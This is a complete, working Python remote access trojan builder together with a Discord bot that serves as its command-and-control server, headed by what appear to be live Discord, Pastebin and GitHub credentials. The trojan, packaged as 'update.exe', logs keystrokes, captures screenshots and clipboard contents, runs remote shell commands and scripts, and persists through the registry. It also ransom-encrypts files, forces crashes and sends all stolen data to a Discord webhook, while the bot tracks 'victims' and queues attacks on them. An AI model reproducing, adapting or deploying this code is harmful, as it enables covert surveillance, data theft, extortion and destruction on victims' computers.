pip install requests pillow pynput cryptography pywin32 pyinstaller pyperclip discord.py

https://discord.com/api/webhooks/1453489886308073522/o9Bg9jBIWlj8nUGlYdMWHlLALtzIoIedkwtioTFgFPVX3SEo7WeolqoqEvZUbSA1W1JB

MTQ1MzQ4Njg3ODk3MDg3MTk3Mg.GSV3BK.YJhYzr25_Tef s0VAH5VMeZnEPCvJXyKZ5JlNVU

server id = 1264299849063333919

Channel id = 1264299849604661331

https://pastebin.com/raw/m5U6eger

pastebin key = mGiXZ4yQB6I4SArToIF1bs6v7fZPv9Fc

gist = ghp_UoAoELhp85APCUUpe4d4Ty 4yXltOcK39Dof4

gist id = 3bc0ef1bad059fdf147b42ea06bca7df/raw/2ba7b196ba08fd25d0d34cdcda8e88ca4a3c51bf

gist 32 char = 3bc0ef1bad059fdf147b42ea06bca7df

https://gist.githubusercontent.com/IDKwhyimhereDoyou/3bc0ef1bad059fdf147b42ea06bca7df/raw/commands.json

import os
import subprocess
import shutil

webhook_url = input("Discord webhook URL (main one for initial bite): ").strip()
command_url = input("Gist raw URL (FIXED_RAW_URL): ").strip()
output_name = "update.exe"

rat_code = r'''import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip, urllib.request
from PIL import ImageGrab
from pynput.keyboard import Listener, Key
from cryptography.fernet import Fernet
import winreg

WEBHOOK_URL = "PLACEHOLDER_WEBHOOK"
COMMAND_URL = "PLACEHOLDER_COMMAND"
POLL_INTERVAL = 15
VICTIM_ID = hashlib.md5((getpass.getuser() + socket.gethostname()).encode()).hexdigest()[:8]
KEYLOG_BUFFER = ""

def send(msg="", embed=None, file=None):
    global WEBHOOK_URL
    if msg:
        msg = f"[{VICTIM_ID}] {msg}"
    if embed and "title" in embed:
        embed["title"] = f"[{VICTIM_ID}] {embed['title']}"
    data = {"content": msg}
    if embed:
        data["embeds"] = [embed]
    files = {"file": file} if file else None
    try:
        requests.post(WEBHOOK_URL, json=data, files=files, timeout=10)
    except:
        pass

def info():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        ip = "Unknown"
    embed = {"title": "WE GOT A BITE CAPTAIN", "description": f"**Victim ID:** {VICTIM_ID}\n**User:** {getpass.getuser()}\n**PC:** {socket.gethostname()}\n**IP:** {ip}", "color": 16711680}
    send(embed=embed)

def anti_vm():
    try:
        output = subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower()
        if any(ind in output for ind in ["virtual", "vmware", "vbox", "qemu", "xen"]):
            sys.exit(0)
    except:
        pass

def elevate():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

def persist():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "UpdateCheck", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(key)
    except:
        pass

def on_press(key):
    global KEYLOG_BUFFER
    try:
        KEYLOG_BUFFER += key.char
    except:
        KEYLOG_BUFFER += f" [{str(key)}] "
    if len(KEYLOG_BUFFER) > 500:
        send(f"Keylog dump:\n{KEYLOG_BUFFER}")
        KEYLOG_BUFFER = ""

def screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    send("Screenshot", file=("ss.png", buf, "image/png"))

def lock_pc():
    ctypes.windll.user32.LockWorkStation()
    send("Workstation locked")

def toggle_tm(enable=True):
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0 if enable else 1)
        winreg.CloseKey(key)
        send(f"Task Manager {'enabled' if enable else 'disabled'}")
    except:
        pass

def bsod():
    send("Triggering BSOD...")
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))

def encrypt(path=os.path.expanduser("~\\Desktop")):
    key = Fernet.generate_key()
    f = Fernet(key)
    send(f"ENCRYPTION KEY - SAVE IT: {key.decode()}")
    count = 0
    exts = (".docx", ".pdf", ".jpg", ".png", ".txt", ".xlsx")
    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(exts):
                fp = os.path.join(root, file)
                try:
                    with open(fp, "rb") as d:
                        enc = f.encrypt(d.read())
                    with open(fp + ".locked", "wb") as o:
                        o.write(enc)
                    os.remove(fp)
                    count += 1
                except:
                    pass
    send(f"Encrypted {count} files in {path}")

def shell(cmd):
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    except Exception as e:
        out = str(e)
    send(f"Shell output:\n{out[:3000]}")

def clipboard():
    send(f"Clipboard: {pyperclip.paste()}")

def reboot():
    subprocess.call("shutdown /r /t 0", shell=True)
    send("Rebooting...")

def shutdown():
    subprocess.call("shutdown /s /t 0", shell=True)
    send("Shutting down...")

def runscript(code):
    try:
        exec(code)
        send("Script executed")
    except Exception as e:
        send(f"Script error: {str(e)}")

def setwebhook(url):
    global WEBHOOK_URL
    WEBHOOK_URL = url
    send("Webhook switched to new URL")

def msgbox(text):
    ctypes.windll.user32.MessageBoxW(0, text, "Important Message", 1)
    send(f"Message box shown: {text}")

def volume_max():
    subprocess.call("nircmd.exe setsysvolume 65535", shell=True)  # Needs nircmd bundled or use win API
    send("Volume cranked to max")

def openurl(url):
    os.startfile(url)
    send(f"Opened URL: {url}")

def set_wallpaper(url):
    path = os.path.join(os.getenv("TEMP"), "wallpaper.jpg")
    urllib.request.urlretrieve(url, path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    send(f"Wallpaper set to {url}")

def forkbomb():
    while True:
        subprocess.Popen(sys.argv[0])

def poll():
    while True:
        try:
            cmds = requests.get(COMMAND_URL, timeout=10).json()
            if str(VICTIM_ID) in cmds:
                full = cmds[str(VICTIM_ID)].strip()
                parts = full.split(" ", 1)
                cmd = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ""
                send(f"Command received: {full}")
                if cmd == "ss":
                    screenshot()
                elif cmd == "lock":
                    lock_pc()
                elif cmd == "disabletm":
                    toggle_tm(False)
                elif cmd == "enabletm":
                    toggle_tm(True)
                elif cmd == "bsod":
                    bsod()
                elif cmd == "encrypt":
                    encrypt(arg or os.path.expanduser("~\\Desktop"))
                elif cmd == "shell":
                    shell(arg)
                elif cmd == "clipboard":
                    clipboard()
                elif cmd == "reboot":
                    reboot()
                elif cmd == "shutdown":
                    shutdown()
                elif cmd == "runscript":
                    runscript(arg)
                elif cmd == "setwebhook":
                    setwebhook(arg)
                elif cmd == "msgbox":
                    msgbox(arg or "You have been owned")
                elif cmd == "volume":
                    volume_max()
                elif cmd == "openurl":
                    openurl(arg or "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
                elif cmd == "wallpaper":
                    set_wallpaper(arg or "https://i.imgur.com/removed.png")
                elif cmd == "forkbomb":
                    forkbomb()
        except:
            pass
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    # anti_vm()  # Commented for VM testing — uncomment for real deployments
    elevate()
    persist()
    info()
    threading.Thread(target=poll, daemon=True).start()
    with Listener(on_press=on_press) as l:
        l.join()
'''

rat_code = rat_code.replace("PLACEHOLDER_WEBHOOK", webhook_url)
rat_code = rat_code.replace("PLACEHOLDER_COMMAND", command_url)

with open("rat.py", "w") as f:
    f.write(rat_code)

print("Building non-instant-BSOD RAT with new commands...")
subprocess.run([
    "pyinstaller","--onefile","--noconsole",
    "--collect-all","pynput",
    "--hidden-import=pynput.keyboard._win32",
    "--hidden-import=pynput._util.win32",
    "--name",output_name,"rat.py"
])

shutil.rmtree("build", ignore_errors=True)
shutil.rmtree("__pycache__", ignore_errors=True)
os.remove("rat.py") if os.path.exists("rat.py") else None
os.remove("rat.spec") if os.path.exists("rat.spec") else None

print(f"EXE ready: dist\\{output_name} — no instant BSOD, anti_vm commented for testing")










import discord
import re
import requests
import json

TOKEN = "YOUR_DISCORD_BOT_TOKEN"
GUILD_ID = 123456789012345678
LOG_CHANNEL_ID = 987654321098765432
GIST_ID = "3bc0ef1bad059fdf147b42ea06bca7df"
GH_TOKEN = "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

FIXED_RAW_URL = "https://gist.githubusercontent.com/IDKwhyimhereDoyou/3bc0ef1bad059fdf147b42ea06bca7df/raw/commands.json"

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

known_victims = set()

def update_gist(commands_dict):
    url = f"https://api.github.com/gists/{GIST_ID}"
    headers = {"Authorization": f"token {GH_TOKEN}"}
    data = {"files": {"commands.json": {"content": json.dumps(commands_dict)}}}
    r = requests.patch(url, headers=headers, json=data)
    if r.status_code == 200:
        print("[+] Gist updated")
    else:
        print(f"[-] Gist error: {r.text}")

async def create_victim_section(vid):
    guild = client.get_guild(GUILD_ID)
    cat = await guild.create_category(f"Victim-{vid}")
    ch = await cat.create_text_channel(f"logs-{vid}", overwrites={
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
    })
    # Create webhook in private channel
    webhook = await ch.create_webhook(name="Victim Exfil")
    webhook_url = webhook.url
    # Queue setwebhook to switch RAT to this private webhook
    current = requests.get(FIXED_RAW_URL).json() or {}
    current[vid] = f"setwebhook {webhook_url}"
    update_gist(current)
    return ch

@client.event
async def on_ready():
    print(f"[+] Bot live - FIXED_RAW_URL: {FIXED_RAW_URL}")

@client.event
async def on_message(message):
    if message.author.bot: return

    # BITE DETECTION
    if message.channel.id == LOG_CHANNEL_ID:
        full_text = message.content
        for embed in message.embeds:
            full_text += " " + (embed.title or "") + " " + (embed.description or "")
        if "WE GOT A BITE CAPTAIN" in full_text.upper():
            vid_match = re.search(r"([a-f0-9]{8})", full_text)
            if vid_match:
                vid = vid_match.group(1)
                if vid not in known_victims:
                    known_victims.add(vid)
                    ch = await create_victim_section(vid)
                    await message.reply(f"**BITE** Victim **{vid}** hooked — Room: {ch.mention}")
                    # Confirmation from RAT will come to private webhook

    # COMMANDS
    if message.channel.name.startswith("logs-") and message.content.startswith("-"):
        vid = message.channel.name[5:13]
        content = message.content[1:].strip().lower()
        parts = content.split(" ", 1)
        cmd = parts[0]
        arg = parts[1] if len(parts) > 1 else ""
        
        if cmd == "clear":
            current = requests.get(FIXED_RAW_URL).json() or {}
            current.pop(vid, None)
            update_gist(current)
            await message.reply(f"Cleared queue for **{vid}**")
            return
        
        full_cmd = cmd
        if cmd in ["encrypt", "shell", "runscript"]:
            full_cmd += " " + arg
        
        current = requests.get(FIXED_RAW_URL).json() or {}
        current[vid] = full_cmd
        update_gist(current)
        
        await message.reply(f"**{full_cmd}** queued for **{vid}** — RAT will confirm receipt in <30s")

client.run(TOKEN)
